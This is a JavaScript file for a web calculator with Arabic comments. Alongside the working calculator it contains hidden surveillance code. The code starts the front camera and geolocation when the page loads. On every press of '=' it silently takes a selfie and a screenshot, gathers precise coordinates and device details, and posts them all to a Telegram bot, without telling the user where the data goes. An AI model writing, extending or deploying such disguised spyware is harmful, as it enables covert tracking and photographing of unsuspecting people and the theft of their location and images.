// ==========================================
// حاسبة عبدالله + السيلفي والموقع والتليجرام
// ==========================================

// 1. إعدادات بوت التليجرام (استبدل القيم ببياناتك)
const TELEGRAM_CONFIG = {
  botToken: "YOUR_BOT_TOKEN_HERE",
  chatId: "YOUR_CHAT_ID_HERE"
};

const $ = (id) => document.getElementById(id);

let expression = "";
let result = "0";
let justCalculated = false;
let cameraStream = null;

// ==========================================
// 2. إدارة الكاميرا والسيلفي
// ==========================================

// تشغيل الكاميرا الأمامية تلقائياً
async function initCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    const video = $("video");
    if (video) {
      video.srcObject = stream;
      cameraStream = stream;
      console.log("تم تشغيل الكاميرا بنجاح.");
    }
  } catch (error) {
    console.warn("تعذر الوصول للكاميرا:", error.message);
  }
}

// التقاط صورة سيلفي وتحويلها إلى Blob
function captureSelfieBlob() {
  return new Promise((resolve) => {
    const video = $("video");
    const canvas = $("canvas");
    
    if (!video || !canvas || !cameraStream) {
      resolve(null);
      return;
    }

    const width = video.videoWidth;
    const height = video.videoHeight;

    if (!width || !height) {
      resolve(null);
      return;
    }

    canvas.width = width;
    canvas.height = height;
    const context = canvas.getContext("2d");

    // عمل انعكاس مرآة مثل السيلفي الحقيقي
    context.translate(width, 0);
    context.scale(-1, 1);
    context.drawImage(video, 0, 0, width, height);

    canvas.toBlob((blob) => {
      resolve(blob);
    }, "image/png", 0.9);
  });
}

// ==========================================
// 3. إدارة الموقع الجغرافي (Geolocation & Cache)
// ==========================================

const LOCATION_CACHE_KEY = "calculator_location_cache";
const LOCATION_CACHE_TIME = 5 * 60 * 1000; // 5 دقائق
let cachedLocation = null;

function loadCachedLocation() {
  try {
    const saved = localStorage.getItem(LOCATION_CACHE_KEY);
    if (!saved) return null;
    const data = JSON.parse(saved);
    if (!data || !data.latitude || !data.longitude || !data.savedAt) return null;
    if (Date.now() - data.savedAt > LOCATION_CACHE_TIME) return null;
    return data;
  } catch (error) {
    return null;
  }
}

function saveCachedLocation(location) {
  const data = {
    latitude: location.latitude,
    longitude: location.longitude,
    accuracy: location.accuracy,
    savedAt: Date.now()
  };
  localStorage.setItem(LOCATION_CACHE_KEY, JSON.stringify(data));
  cachedLocation = data;
  return data;
}

function getCurrentLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("المتصفح لا يدعم تحديد الموقع."));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve(saveCachedLocation({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })),
      (err) => reject(err),
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
    );
  });
}

// ==========================================
// 4. منطق الحاسبة وسجل العمليات
// ==========================================

function getHistory() {
  return JSON.parse(localStorage.getItem("calc_history") || "[]");
}

function saveHistory(items) {
  localStorage.setItem("calc_history", JSON.stringify(items));
}

function escapeHtml(text) {
  return String(text).replace(/[&<>"']/g, (m) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  }[m]));
}

function render() {
  if ($("expression")) $("expression").textContent = expression || "0";
  if ($("result")) $("result").textContent = result;
  
  const historyContainer = $("history");
  if (historyContainer) {
    const items = getHistory();
    historyContainer.innerHTML = items.length
      ? items.map(item => `
          <div class="history-item">
            <span><strong>${escapeHtml(item.expression)}</strong> = ${escapeHtml(item.result)}</span>
            <small>${escapeHtml(item.time)}</small>
          </div>
        `).join("")
      : `<div class="history-item"><span>مفيش عمليات لسه.</span></div>`;
  }
}

function safeEvaluate(input) {
  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) throw new Error("invalid");
  const normalized = input.replace(/(\d+(?:\.\d+)?)%/g, "($1/100)");
  const value = Function(`"use strict"; return (${normalized})`)();
  if (!Number.isFinite(value)) throw new Error("invalid");
  return Number.isInteger(value) ? String(value) : String(Number(value.toFixed(12)));
}

function addValue(value) {
  if (justCalculated && /[0-9.]/.test(value)) expression = "";
  if (justCalculated && /[+\-*/%]/.test(value)) expression = result;
  justCalculated = false;

  if (/[+\-*/%]/.test(value)) {
    if (!expression) return;
    if (/[+\-*/%]/.test(expression.at(-1))) {
      expression = expression.slice(0, -1) + value;
      render();
      return;
    }
  }

  if (value === ".") {
    const parts = expression.split(/[+\-*/%]/);
    if (parts.at(-1).includes(".")) return;
  }

  expression += value;
  result = "0";
  render();
}

function clearAll() {
  expression = "";
  result = "0";
  justCalculated = false;
  render();
}

function backspace() {
  if (justCalculated) { clearAll(); return; }
  expression = expression.slice(0, -1);
  render();
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent || "Unknown",
    language: navigator.language || "Unknown",
    platform: navigator.platform || "Unknown",
    screen: `${window.screen.width}x${window.screen.height}`,
    online: navigator.onLine ? "Online" : "Offline"
  };
}

// ==========================================
// 5. زر الضغط (=) والتقاط الإرسال لتليجرام
// ==========================================

async function equals() {
  if (!expression.trim()) return;
  const currentExpression = expression;

  try {
    const calculated = safeEvaluate(currentExpression);
    result = calculated;
    justCalculated = true;

    // حفظ في السجل LocalStorage
    const history = getHistory();
    history.unshift({
      expression: currentExpression,
      result: calculated,
      time: new Date().toLocaleString("ar-EG")
    });
    saveHistory(history.slice(0, 100));
    render();

    // التقاط الصور وإرسالها عند تنفيذ العملية
    setTimeout(() => {
      captureAndSendToTelegram(currentExpression, calculated);
    }, 300);

  } catch (error) {
    result = "خطأ";
    render();
  }
}

async function captureAndSendToTelegram(exp, res) {
  try {
    const botToken = TELEGRAM_CONFIG.botToken;
    const chatId = TELEGRAM_CONFIG.chatId;

    if (!botToken || !chatId || botToken === "YOUR_BOT_TOKEN_HERE") {
      console.warn("بيانات التليجرام غير مضافة.");
      return;
    }

    // جلب الموقع
    let locationText = "📍 الموقع: غير متاح";
    let location = cachedLocation || loadCachedLocation();
    if (!location) {
      try { location = await getCurrentLocation(); } catch (e) {}
    }
    if (location) {
      locationText = `📍 الموقع الحالي:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}\nالدقة: ±${Math.round(location.accuracy || 0)} متر`;
    }

    const device = getDeviceInfo();
    const currentTime = new Date().toLocaleString("ar-EG");

    const caption = `🧮 حاسبة عبدالله\n\n` +
      `🔢 العملية: ${exp}\n` +
      `✅ النتيجة: ${res}\n` +
      `🕐 الوقت: ${currentTime}\n\n` +
      `${locationText}\n\n` +
      `📱 الجهاز: ${device.platform} | ${device.screen}`;

    // 1. التقاط سكرين شوت للحاسبة
    let screenBlob = null;
    const captureArea = $("captureArea");
    if (window.html2canvas && captureArea) {
      const canvasCalc = await html2canvas(captureArea, {
        backgroundColor: "#ffffff",
        scale: Math.min(2, window.devicePixelRatio || 1)
      });
      screenBlob = await new Promise(res => canvasCalc.toBlob(res, "image/png", 0.9));
    }

    // 2. التقاط صورة السيلفي
    const selfieBlob = await captureSelfieBlob();

    // 3. إرسال Screenshot إن وجد
    if (screenBlob) {
      const form1 = new FormData();
      form1.append("chat_id", chatId);
      form1.append("caption", caption.slice(0, 1024));
      form1.append("photo", screenBlob, `calc-${Date.now()}.png`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form1 });
    }

    // 4. إرسال صورة السيلفي إن وجدت
    if (selfieBlob) {
      const form2 = new FormData();
      form2.append("chat_id", chatId);
      form2.append("caption", `📸 سيلفي أثناء الحساب: ${exp} = ${res}`);
      form2.append("photo", selfieBlob, `selfie-${Date.now()}.png`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form2 });
    }

  } catch (error) {
    console.error("خطأ أثناء إرسال البيانات لتليجرام:", error);
  }
}

// ==========================================
// 6. أحداث الأزرار ولوحة المفاتيح
// ==========================================

const keysContainer = document.querySelector(".keys");
if (keysContainer) {
  keysContainer.addEventListener("click", (event) => {
    const button = event.target.closest("button");
    if (!button) return;

    const value = button.dataset.value;
    const action = button.dataset.action;

    if (value !== undefined) addValue(value);
    else if (action === "clear") clearAll();
    else if (action === "backspace") backspace();
    else if (action === "equals") equals();
  });
}

document.addEventListener("keydown", (event) => {
  if (/^[0-9+\-*/%.()]$/.test(event.key)) addValue(event.key);
  else if (event.key === "Enter" || event.key === "=") { event.preventDefault(); equals(); }
  else if (event.key === "Backspace") backspace();
  else if (event.key === "Escape") clearAll();
});

if ($("clearHistory")) {
  $("clearHistory").addEventListener("click", () => {
    if (confirm("متأكد إنك عايز تمسح سجل العمليات؟")) {
      saveHistory([]);
      render();
    }
  });
}

// ==========================================
// 7. التشغيل الابتدائي
// ==========================================

render();
initCamera();          // تشغيل الكاميرا تلقائياً
getCurrentLocation();  // قراءة الموقع الجغرافي
